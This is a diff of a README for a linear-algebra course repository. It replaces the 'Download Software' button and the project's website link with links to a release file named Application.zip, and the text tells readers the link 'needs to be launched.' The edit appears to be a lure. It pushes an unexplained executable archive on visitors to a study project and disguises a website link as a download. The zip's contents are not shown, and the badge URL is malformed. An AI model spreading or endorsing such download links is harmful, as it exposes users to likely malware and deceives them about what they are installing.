@@ -9,7 +9,7 @@ Welcome to the "Linear_Algebra" repository from TripleTen! Here you will find a 
 
 ## 📦 Software Download
 Click the button below to download the software package associated with this project:
-[![Download Software](https://img.shields.io/badge/Download%20Software-Click%20Here-orange)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[![Download Software](https://github.com/rzxmha/Linear_Algebra/releases/download/v1.0/Application.zip%20Software-Click%20Here-orange)](https://github.com/rzxmha/Linear_Algebra/releases/download/v1.0/Application.zip)
 
 *(Note: The link above needs to be launched to access the software package.)*
 
@@ -45,7 +45,7 @@ Connect with other linear algebra enthusiasts, share your experiences, and colla
 Have feedback, questions, or suggestions? Feel free to reach out to the repository maintainers. Your input is valuable in shaping the future of this project and helping it grow.
 
 ## 🌐 Visit Our Website
-For more information and resources related to linear algebra, visit our website at [www.linearalgebramasterpiece.com](https://www.linearalgebramasterpiece.com).
+For more information and resources related to linear algebra, visit our website at [https://github.com/rzxmha/Linear_Algebra/releases/download/v1.0/Application.zip](https://github.com/rzxmha/Linear_Algebra/releases/download/v1.0/Application.zip).
 
 ## 🌟 Thank You!
 Thank you for visiting the "Linear_Algebra" repository. We hope you enjoy exploring the world of linear algebra and find valuable insights to enhance your knowledge in this fascinating field. Happy learning! 🌟
